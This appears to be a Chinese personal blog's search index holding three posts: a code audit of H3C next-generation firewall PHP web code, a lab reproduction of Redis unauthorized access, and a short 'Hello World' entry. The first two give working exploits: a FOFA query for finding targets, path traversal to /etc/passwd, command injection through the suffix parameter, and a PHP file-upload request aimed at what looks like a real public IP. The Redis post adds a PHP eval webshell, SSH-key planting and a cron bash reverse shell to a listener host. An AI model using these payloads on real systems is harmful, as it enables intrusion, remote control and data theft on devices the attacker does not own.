<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>H3C-下一代防火墙代码审计</title>
    <link href="/2024/11/08/H3C/"/>
    <url>/2024/11/08/H3C/</url>
    
    <content type="html"><![CDATA[<h1 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a>H3C</h1><p>fofa:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app=<span class="hljs-string">&quot;H3C-下一代防火墙&quot;</span> &amp;&amp; server==<span class="hljs-string">&quot;lighttpd/1.4.39&quot;</span><br></code></pre></td></tr></table></figure><h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><p>任意文件读取关键函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file_get_contens、fopen、readfile<br></code></pre></td></tr></table></figure><p>全局file_get_contens，主要看没有写死的</p><img src="/2024/11/08/H3C/image-20241030000311-d2lmo0n.png" class="" title="image"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;sys_dia_data_down&#x27;</span>)&#123;<br><span class="hljs-comment">// if($_POST[&#x27;file_name&#x27;]!=null) $param[&#x27;file_name&#x27;] = formatpost($_POST[&#x27;file_name&#x27;]);</span><br><span class="hljs-variable">$fname</span> = <span class="hljs-string">&quot;/mnt/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$fname</span>);<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Pragma: public&quot;</span>);<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Cache-Control: private&quot;</span>);<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: text/plain&quot;</span>);<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>));<br><span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_name&#x27;</span>] );<br><span class="hljs-title function_ invoke__">ob_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241030000233-fxjyvep.png" class="" title="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/webui/?file_name=../../../../../etc/passwd&amp;g=sys_dia_data_down<br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241030000505-11kcw12.png" class="" title="image">​</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>关键函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">system、exec、call_user_func、shell_exec<br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241031150745-r06xyqv.png" class="" title="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$portal_catalog</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$type</span>.<span class="hljs-string">&#x27;/images/&#x27;</span>.<span class="hljs-variable">$type</span>.<span class="hljs-string">&#x27;*&#x27;</span>);<br><br>rm /usr/local/webui/auth/portal  | <span class="hljs-keyword">echo</span> <span class="hljs-number">4444</span> /usr/local/webui/auth/images/<span class="hljs-number">1</span>.txt ;|<span class="hljs-keyword">echo</span> <span class="hljs-number">4444</span>/usr/local/webui/auth/images/<span class="hljs-number">1</span>.txt;*<br><br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241031161635-q6ufxkg.png" class="" title="image">​</p><p>‍</p><p>​<img src="/2024/11/08/H3C/image-20241031161614-13u47uv.png" class="" title="image">​</p><p>‍</p><h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>g&#x3D;<code>aaa_local_web_custom_auth_submit</code>​</p><p>​<img src="/2024/11/08/H3C/image-20241031162252-k1w1ybk.png" class="" title="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cp /usr/local/webui/auth/images/&quot;</span>.<span class="hljs-variable">$newName</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-string">&quot;/mnt/portal_custom/images/&quot;</span>.<span class="hljs-variable">$newName</span>);<br></code></pre></td></tr></table></figure><p>​<code>$suffx</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$suffix</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>​<code>$bakName</code>​  <code>$newName</code>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newName</span> = <span class="hljs-string">&#x27;tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>; <span class="hljs-comment">//预览用的</span><br><span class="hljs-variable">$bakName</span> = <span class="hljs-string">&#x27;tmpPic2&#x27;</span>.<span class="hljs-variable">$suffix</span>; <span class="hljs-comment">//替换main.jpg用的</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/webui/?g=aaa_local_web_custom_auth_submit&amp;suffix=||<span class="hljs-keyword">echo</span>$&#123;IFS&#125;`ls`|tee$&#123;IFS&#125;-a$&#123;IFS&#125;/usr/local/webui/auth/images/<span class="hljs-number">2</span>.txt;<br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241031165747-z9jkn1j.png" class="" title="image">​</p><p>​<img src="/2024/11/08/H3C/image-20241031165639-4d5yczv.png" class="" title="image">​</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">move_uploaded_file</span>() <br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241031171050-5ecxick.png" class="" title="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;aaa_local_web_preview&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$suffix</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;suffix&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;webTitle&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$webTitle</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;webTitle&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wcmWord&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$wcmWord</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wcmWord&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;titleOnly&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$titleOnly</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;titleOnly&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]!=<span class="hljs-literal">null</span>) <span class="hljs-variable">$read</span> = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read&#x27;</span>]);<br><span class="hljs-variable">$read</span> = (<span class="hljs-variable">$read</span>)?<span class="hljs-variable">$read</span>:<span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$webTitle</span> = (<span class="hljs-variable">$webTitle</span>)?<span class="hljs-variable">$webTitle</span>:<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$wcmWord</span> = (<span class="hljs-variable">$wcmWord</span>)?<span class="hljs-variable">$wcmWord</span>:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$webTitle</span> = <span class="hljs-title function_ invoke__">utf8format</span>(<span class="hljs-variable">$webTitle</span>);<br><span class="hljs-variable">$wcmWord</span> = <span class="hljs-title function_ invoke__">utf8format</span>(<span class="hljs-variable">$wcmWord</span>);<br><br><span class="hljs-comment">//已经预览过，不再进行上传图片动作，且不删除tmpPic文件</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$read</span>)&#123;<br><span class="hljs-keyword">if</span>((!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.png&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.jpeg&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic.gif&#x27;</span>))&amp;&amp;(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>)))&#123;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$filename</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>);<br><span class="hljs-variable">$preview_tip</span> = <span class="hljs-string">&#x27;上传文件过大，建议小于&#x27;</span>.<span class="hljs-variable">$size</span>.<span class="hljs-string">&#x27;MB&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>)&gt;<span class="hljs-variable">$bytesize</span>)&#123;<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;/usr/local/webui/auth/images/tmpPic&#x27;</span>.<span class="hljs-variable">$suffix</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;tip: &#x27;&quot;</span> . <span class="hljs-variable">$preview_tip</span> . <span class="hljs-string">&quot;&#x27;,\n&quot;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;msg: &#x27;&quot;</span> . <span class="hljs-variable">$msg</span> . <span class="hljs-string">&quot;&#x27;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /webui/index.php?g=aaa_local_web_preview&amp;name=a&amp;suffix=<span class="hljs-number">1</span>.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">219.145</span>.<span class="hljs-number">245.245</span>:<span class="hljs-number">8443</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXX<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_14_3</span>) AppleWebKit/<span class="hljs-number">605.1</span>.<span class="hljs-number">15</span> (KHTML, like Gecko) Version/<span class="hljs-number">12.0</span>.<span class="hljs-number">3</span> Safari/<span class="hljs-number">605.1</span>.<span class="hljs-number">15</span><br>Content-Length: <span class="hljs-number">140</span><br><br>------WebKitFormBoundaryXXX<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;a&quot;</span>; filename=<span class="hljs-string">&quot;1.php&quot;</span><br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br>------WebKitFormBoundaryXXX<br></code></pre></td></tr></table></figure><p>​<img src="/2024/11/08/H3C/image-20241031232011-kzwwcc0.png" class="" title="image">​</p><p>​<img src="/2024/11/08/H3C/image-20241031232110-5hiy89k.png" class="" title="image">​</p><h2 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h2><p>​<img src="/2024/11/08/H3C/image-20241101140528-q1mmuwd.png" class="" title="image">​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-variable">$get_url_param</span> == <span class="hljs-string">&#x27;local_cert_delete_both&#x27;</span>)&#123;<br><span class="hljs-comment">/*get value from url*/</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-variable">$params</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-title function_ invoke__">formatget</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$params</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;<span class="hljs-variable">$value</span>)&#123;<br><span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;cert_file_name&#x27;</span>] = <span class="hljs-variable">$value</span>;<br><span class="hljs-variable">$rspString</span> = <span class="hljs-title function_ invoke__">getResponse</span>( <span class="hljs-variable">$module_name</span>, <span class="hljs-string">&quot;del&quot;</span> , <span class="hljs-variable">$param</span>, <span class="hljs-variable">$get_url_param</span> );<br>&#125;<br><span class="hljs-comment">/*display message*/</span><br><span class="hljs-title function_ invoke__">showSuccess</span>(<span class="hljs-string">&#x27;local_cert_show&#x27;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权</title>
    <link href="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h1><p>在kali上安装redis服务，并启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://download.redis.io/releases/redis-2.8.17.tar.gz  #下载压缩包<br>tar -zxvf redis-2.8.17.tar.gz  #解压<br>cd redis-2.8.17/src<br>make install   #这里必须使用sudo权限<br>cp redis-server /usr/bin<br>cp redis-cli /usr/bin<br><br>redis-server /etc/redis.conf  #启动服务<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里显示/etc下面没有redis.conf ，我直接网上下载了一个</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240307112011309.png"></p><p>在windows上连接</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240307112117110.png"></p><p>也可以使用redis-cli命令连接器</p><h3 id="1、木马生成攻击"><a href="#1、木马生成攻击" class="headerlink" title="1、木马生成攻击"></a>1、木马生成攻击</h3><p>环境：</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240307111651726.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">config get dir  #查看redis数据库路径<br>config set dir /root/fuxian/redis-2.8.17 #修改redies数据库路径<br>config set dbfilename shell.php  #生成shell.php文件，文件会生成在数据库路径下<br>set xxx &quot;\r\n\r\n&lt;?php eval($_POST[cmd]);?&gt;\r\n\r\n&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将一句话木马写入shell.php</span><br>save  #保存，文件生成完成<br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240307113155471.png"></p><p>写入成功</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240307113223311.png"></p><p>我在本地写完shell.php后，无法利用，因为kali上没有开启web服务</p><blockquote><p>想要利用需要：开启web服务，并且知道路径，这样我们就可以利用url使用蚁剑进行连接</p></blockquote><h3 id="2、ssh密钥连接"><a href="#2、ssh密钥连接" class="headerlink" title="2、ssh密钥连接"></a>2、ssh密钥连接</h3><p>环境：</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240308212632971.png"></p><blockquote><p>原理:</p><p>攻击机上生成ssh密钥通过redis写入到目标主机的&#x2F;root&#x2F;.ssh</p></blockquote><p>刚开始ubuntu是连不上kali的</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240308233939262.png"></p><p>1、先在攻击机上生成密钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa   #生成本地密钥<br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240308234058719.png"></p><p>2、将公钥写入到key.txt里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(echo -e &quot;\n&quot;;cat /home/meixiaoyi/.ssh/id_rsa.pub;echo -e &quot;\n&quot;) &gt; key.txt<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里前后都加\n是为了避免和redis其他缓存数据混合</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240308234702048.png"></p><p>3、将key.txt 文件写入redis缓存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /home/meixiaoyi/key.txt |./redis-cli -h 192.168.198.148 -x set pub<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-x：这个选项表示后面的数据将从标准输入(stdin)中读取，并作为命令的参数传递给Redis</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">pub键名，值为key.txt里面的内容</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0/image-20240308235310130.png"></p><p>4、设置redis的dump文件路径为&#x2F;root&#x2F;.ssh且文件名为authorized_keys</p><h3 id="3、写入定时任务"><a href="#3、写入定时任务" class="headerlink" title="3、写入定时任务"></a>3、写入定时任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.198.140/5555 0&gt;&amp;1\n\n&quot;<br><br>config set dir /var/spool/cron<br><br>config set dbfilename root<br><br>save<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/02/15/Hello-World2/"/>
    <url>/2024/02/15/Hello-World2/</url>
    
    <content type="html"><![CDATA[<p>终于有自己的博客啦！！！小梅同学好棒呀！！！<br>希望自己真的能做到像博客页脚上写的那样 “不要被任何人左右你的情绪”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&#x27;不要被任何人左右你的情绪&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2024/02/15/Hello-World2/img.png" alt="图片"></p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
